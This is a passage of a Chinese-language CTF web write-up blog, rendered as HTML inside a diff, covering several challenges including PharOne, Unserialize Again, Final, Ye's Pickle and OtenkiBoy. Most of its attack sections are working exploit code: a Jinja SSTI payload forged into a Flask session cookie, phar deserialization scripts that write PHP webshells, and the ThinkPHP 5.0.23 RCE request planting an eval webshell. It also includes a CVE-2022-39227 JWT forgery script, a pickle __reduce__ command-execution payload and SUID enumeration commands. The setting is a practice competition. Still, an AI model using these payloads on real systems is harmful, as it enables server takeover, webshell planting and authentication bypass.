class="comment">#     a=requests.get(url=url, cookies=cookiet)</span></span><br><span class="line"><span class="comment">#     if &quot;os&quot; in a.text:</span></span><br><span class="line"><span class="comment">#         print(a.text)</span></span><br><span class="line"><span class="comment">#         print(j)</span></span><br><span class="line"></span><br><span class="line">cookie_structure = <span class="string">&quot;&#123;&#x27;user&#x27;: \&quot;&#123;% print([][&#x27;_&#x27;&#x27;_cla&#x27;&#x27;ss_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_ba&#x27;&#x27;se_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_subcla&#x27;&#x27;sses_&#x27;&#x27;_&#x27;]()[117][&#x27;_&#x27;&#x27;_ini&#x27;&#x27;t_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_glo&#x27;&#x27;bals_&#x27;&#x27;_&#x27;][&#x27;po&#x27;&#x27;pen&#x27;](&#x27;ca&#x27;&#x27;t /y0U3_f14g_1s_h3re&#x27;)[&#x27;read&#x27;]()) %&#125;\&quot;&#125;&quot;</span> <span class="comment">#tail</span></span><br><span class="line"><span class="built_in">print</span>(cookie_structure)</span><br><span class="line">secret = <span class="string">&#x27;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&#x27;</span></span><br><span class="line">payload = flask_session_cookie_manager3.FSCM.encode(secret,cookie_structure)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+<p>——————————————————————————————————————————————————</p>
+<h3 id="PharOne"><a href="#PharOne" class="headerlink" title="PharOne"></a>PharOne</h3><p>phar反序列化，检测<code>__HALT_COMPILER()</code>，用<code>gzip</code>绕过</p>
+<p>无回显rce，有写入权限，直接在<code>/var/www/html</code>下新写一个可以回显的:horse:</p>
+<p>至于反弹shell，没成功，原因未知（（（</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;cmd=<span class="string">&quot;echo &#x27;&lt;?=system(\$_GET[1]);?&gt;&#x27;&gt;/var/www/html/1.php&quot;</span>;</span><br><span class="line"><span class="variable">$phartest</span> = <span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;pharone.phar&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>——————————————————————————————————————————————————</p>
+<h3 id="OtenkiBoy"><a href="#OtenkiBoy" class="headerlink" title="OtenkiBoy"></a>OtenkiBoy</h3><p>Week3OtenkiGirl的加强版，还是JavaScript原型链污染</p>
+<p>主要分析<code>routes/info.js,routes/submit.js,routes/_components/utils.js</code></p>
+<p>可以发现utils.js中的mergeJSON()函数仍然是一个递归的可浅可深的拷贝，但是过滤了<code>__proto__</code></p>
+<p>那么可以用<code>&#123;&#39;constructor&#39;:&#123;&#39;prototype&#39;:&#39;&#39;&#125;&#125;</code>来绕过，这两者是等价的</p>
+<p>其余的剩下再打</p>
+<p>——————————————————————————————————————————————————</p>
+<h2 id="WEB-week5"><a href="#WEB-week5" class="headerlink" title="WEB-week5"></a>WEB-week5</h2><h3 id="Unserialize-Again"><a href="#Unserialize-Again" class="headerlink" title="Unserialize Again"></a>Unserialize Again</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;human&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>!=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$fffflag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;AshenOne&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eating=<span class="string">&#x27;fire&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user.<span class="variable language_">$this</span>-&gt;pass;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;pass==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$nothing</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;God==<span class="string">&#x27;true&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;eating);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Get Out!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;                 </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// $Eden=new story();</span></span><br><span class="line">    <span class="variable">$pear</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>];</span><br><span class="line">    <span class="variable">$Adam</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$pear</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="title function_ invoke__">file_exists</span>(<span class="variable">$Adam</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;多吃雪梨&#x27;</span>;</span><br><span class="line">&#125; 多吃雪梨</span><br></pre></td></tr></table></figure>
+
+<p>一堆魔术方法都是骗人的，只有<code>__destruct__</code>有用，满足条件就能任意命令执行了，接下来是传参的部分</p>
+<p>首先要明确<code>file_get_contents(&#39;php://input&#39;)</code>可以读取POST参数，但是呢会保留<code>raw_data</code></p>
+<p>比如说单单传入一个或多个字符是不行的，必须有<code>a=123</code>这样类似的形式，再看下一行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">所以会保留```a=xxx```这样子，可以自己在本地测试下，不过这个对于做题倒是无伤大雅，因为phar只会解析有用的</span><br><span class="line"></span><br><span class="line">看到```file_exist```很明确是```phar://```打一个phar反序列化，就是文件写入有点麻烦，而且还要绕过```__wakeup__```</span><br><span class="line"></span><br><span class="line">浏览器抓包可以发现php版本是7.0.9，而php7.0.10就不能通过改变属性个数绕过```__wakeup__```了，所以这题还行</span><br><span class="line"></span><br><span class="line">但是当你生成phar后再修改，那么phar的签名就无效了，必须得重新加密签名，详见下面的博客</span><br><span class="line"></span><br><span class="line">&gt; https://www.cnblogs.com/CoLo/p/16786627.html</span><br><span class="line"></span><br><span class="line">而且传文件得用python（我只会python，hackbar和burp全都寄，用open+read读bytes类型数据</span><br><span class="line"></span><br><span class="line">然后用```urllib.parse.quote```将bytes数据给它url编码了，虽然说是只能传string类型，但其实可以自动转化的</span><br><span class="line"></span><br><span class="line">POC:</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from hashlib import sha1</span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line">urll=&#x27;http://391ffc99-a75c-4ecd-baa4-edac1b638dff.node4.buuoj.cn:81/pairing.php&#x27;</span><br><span class="line">paramss=&#123;</span><br><span class="line">    &#x27;pear&#x27;:&#x27;unsea.phar&#x27;,</span><br><span class="line">    &#x27;apple&#x27;:&#x27;phar://unsea.phar&#x27;</span><br><span class="line">&#125;</span><br><span class="line">with open(&#x27;pharseax.phar&#x27;,&#x27;rb&#x27;) as file:</span><br><span class="line">    f=file.read()</span><br><span class="line">s=f[:-28]</span><br><span class="line">h=f[-8:]</span><br><span class="line">newf = s + sha1(s).digest() + h</span><br><span class="line">with open(&#x27;unsea.phar&#x27;,&#x27;wb&#x27;) as file:</span><br><span class="line">    file.write(newf)</span><br><span class="line"></span><br><span class="line">with open(&#x27;unsea.phar&#x27;,&#x27;rb&#x27;) as fi:</span><br><span class="line">    f=fi.read()</span><br><span class="line">    ff=urllib.parse.quote(f)</span><br><span class="line">    fin=requests.post(url=urll,data=ff,params=paramss)</span><br><span class="line">    print(fin.text)</span><br></pre></td></tr></table></figure>
+
+<p>——————————————————————————————————————————————————</p>
+<h3 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h3><p>Thinkphp-V5.0.23的RCE漏洞，但是照着网上搜到的抄是无结果的，因为system被disable了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?s=captcha</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=1</span><br><span class="line">##可以看到phpinfo里禁用了system</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=exec&amp;method=get&amp;server[REQUEST_METHOD]=echo%20&#x27;&lt;?php%20eval($_POST[&#x27;cmd&#x27;]);?&gt;&#x27;%20&gt;%20/var/www/public/1.php</span><br><span class="line">##写webshell，用蚁剑连接</span><br></pre></td></tr></table></figure>
+
+<p>到根目录之后想直接<code>cat flag</code>，但是没权限，姑且先搜下SUID，但是搜出来无回显，得写到txt里再读取</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null &gt; 1.txt</span><br><span class="line">cp /flag* /dev/stdout</span><br></pre></td></tr></table></figure>
+
+<p>看了writeup，没懂，打算看看SUID提权</p>
+<p>SUID（Set User ID）是给予文件一个特殊类型的权限。具体作用就是把可执行程序所有者的权限赋予可执行程序，无论执行程序的是哪位用户，可执行程序都拥有它的所有者的权限，对于root的文件权限会由rwxr变为rwsr</p>
+<p>设置了s位的程序在运行时，其Effective UID将会设置为这个程序的所有者</p>
+<p>这里引入了一个新的概念Effective UID。Linux进程在运行时有三个UID</p>
+<p>Real UID 执行该进程的用户实际的UID；</p>
+<p>Effective UID 程序实际操作时生效的UID（比如写入文件时，系统会检查这个UID是否有权限）;</p>
+<p>Saved UID 在高权限用户降权后，保留的其原本UID（本文中不对这个UID进行深入探讨）</p>
+<p>Real UID 执行该进程的用户实际的UID，谁通过shell运行就是谁 Effective UID 程序实际操作时生效的UID，一般在进程启动时，直接由Real UID复制而来；或者是当进程对应的可执行文件的suid标志位为s时，为该文件的所属用户&#x2F;组。所以利用suid文件进行提权需要2个前提：文件的所有者是 0 号或其他super user 文件拥有suid权限</p>
+<p><strong>0是root用户的UID</strong></p>
+<p>设置SUID权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s filename</span><br><span class="line">chmod u-s filename # 删除SUID权限</span><br></pre></td></tr></table></figure>
+
+<p>利用find命令找出linux系统上所有SUID的可执行文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br><span class="line">ls -l /usr/bin</span><br></pre></td></tr></table></figure>
+
+<p>分析一下<code>cp /flag* /dev/stdout</code></p>
+<p>执行一个shell命令行时通常会自动打开三个标准文件：</p>
+<ul>
+<li>标准输入文件（stdin），通常对应终端的键盘；</li>
+<li>标准输出文件（stdout）和标准错误输出文件（stderr），这两个文件都对应终端的屏幕。</li>
+</ul>
+<p>进程将从标准输入文件中得到输入数据，将正常输出数据输出到标准输出文件，而将错误信息送到标准错误文件中。所以stdout可以将输入的信息输出到终端上</p>
+<p>——————————————————————————————————————————————————</p>
+<h3 id="Ye’s-Pickle"><a href="#Ye’s-Pickle" class="headerlink" title="Ye’s Pickle"></a>Ye’s Pickle</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> jwcrypto.jwk <span class="keyword">as</span> jwk</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> python_jwt <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_string</span>(<span class="params">length=<span class="number">16</span></span>):</span><br><span class="line">    characters = string.ascii_letters + string.digits  <span class="comment"># 包含字母和数字</span></span><br><span class="line">    random_string = <span class="string">&#x27;&#x27;</span>.join(random.choice(characters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">    <span class="keyword">return</span> random_string</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = generate_random_string(<span class="number">16</span>)</span><br><span class="line">key = jwk.JWK.generate(kty=<span class="string">&#x27;RSA&#x27;</span>, size=<span class="number">2048</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    payload=request.args.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        token=verify_jwt(payload, key, [<span class="string">&#x27;PS256&#x27;</span>])</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=token[<span class="number">1</span>][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=<span class="string">&quot;guest&quot;</span></span><br><span class="line">        user=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;boogipop&quot;</span>,<span class="string">&quot;role&quot;</span>:<span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">        jwt = generate_jwt(user, key, <span class="string">&#x27;PS256&#x27;</span>, timedelta(minutes=<span class="number">60</span>))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,token=jwt)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pickle&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unser</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&quot;role&quot;</span>]==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        pickle.loads(base64.b64decode(request.args.get(<span class="string">&quot;pickle&quot;</span>)))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>上来首先是要考虑一个jwt，用了之前没见过的库<code>jwcrypto, python_jwk</code>，页面会回显token</p>
+<p>然而，<code>SECRET_KEY和key</code>的数量级过大，实在没法强行爆破，也没有任何关于他们的信息，所以到这里就卡住了</p>
+<p>卡了半天，无奈只能看题解，结果是个CVE，没绷住，CVE-2022-39227，参考以下博客</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1990">https://forum.butian.net/share/1990</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> jwcrypto</span><br><span class="line"><span class="keyword">import</span> jwcrypto.jwk <span class="keyword">as</span> jwk</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> python_jwt <span class="keyword">import</span> *</span><br><span class="line">key = jwk.JWK.generate(kty=<span class="string">&#x27;RSA&#x27;</span>, size=<span class="number">2048</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(key))</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">user=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;boogipop&quot;</span>,<span class="string">&quot;role&quot;</span>:<span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">jwt = generate_jwt(user, key, <span class="string">&#x27;PS256&#x27;</span>, timedelta(minutes=<span class="number">60</span>))</span><br><span class="line"><span class="built_in">print</span>(jwt)</span><br><span class="line">jwt=<span class="string">&#x27;页面回显的token&#x27;</span></span><br><span class="line">[header, payload, signature] = jwt.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">parsed_payload = loads(base64url_decode(payload))</span><br><span class="line"><span class="built_in">print</span>(parsed_payload)</span><br><span class="line">parsed_payload[<span class="string">&#x27;role&#x27;</span>]=<span class="string">&quot;admin&quot;</span></span><br><span class="line">fakepayload=base64url_encode((dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))))</span><br><span class="line">fakejwt=<span class="string">&#x27;&#123;&quot;&#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fakepayload + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125;&#x27;</span> </span><br><span class="line"><span class="built_in">print</span>(fakejwt)</span><br></pre></td></tr></table></figure>
+
+<p>下一步就是pickle的问题，pickle嘛，是个新东西，先待我看看和整理一下</p>
+<p>参考以下大神blog</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1069">https://goodapple.top/archives/1069</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11807">https://xz.aliyun.com/t/11807</a></p>
+</blockquote>
+<p>但是这道题单纯地用什么<code>os.system(&#39;ls /&#39;)</code>肯定出不来，因为没有回显，全是模板，那么无回显该怎么办呢</p>
+<p>参考以下博客</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sijidou/p/16305695.html">https://www.cnblogs.com/sijidou/p/16305695.html</a></p>
+</blockquote>
+<p>所以思路是这样：</p>
+<p>随便定义一个类，再调用它的内置方法<code>__reduce__</code>，<code>return</code>一个<code>tuple</code>类型的对象，其中<code>tuple[0]</code>是可执行的内置函数，<code>tuple[1]</code>是给函数传入的字符串方法（一般是系统命令，然后再用<code>pickle.dumps</code>序列化这个随便定义的类就行了（一般是会base64加解密的</p>
+<p>而这里因为没有回显，但是因为<code>debug=True</code>，所以可以通过控制台报错回显（（（太妙了</p>
+<figure class="highlight plaintext"><figcaption><span>raise Exception()```括号内内置```__import__('os').system/popen.read()```就可以了</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">最终payload:</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">class Jex():</span><br><span class="line">	def __reduce__(self):</span><br><span class="line">		return (exec,(&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;cat /flagggggggggggg&#x27;).read())&quot;,))</span><br><span class="line"></span><br><span class="line">def login():	</span><br><span class="line">	poc = base64.b64encode(pickle.dumps(Jex()))</span><br><span class="line">	print(poc)</span><br><span class="line">login()</span><br></pre></td></tr></table></figure>
+
+<p>——————————————————————————————————————————————————</p>
+<h3 id="pppython"><a href="#pppython" class="headerlink" title="pppython?"></a>pppython?</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hint&#x27;</span>] == [<span class="string">&quot;your?&quot;</span>, <span class="string">&quot;mine!&quot;</span>, <span class="string">&quot;hint!!&quot;</span>])&#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/plain&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls / -la&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_CONNECTTIMEOUT, <span class="number">60</span>);</span><br><span class="line">        <span 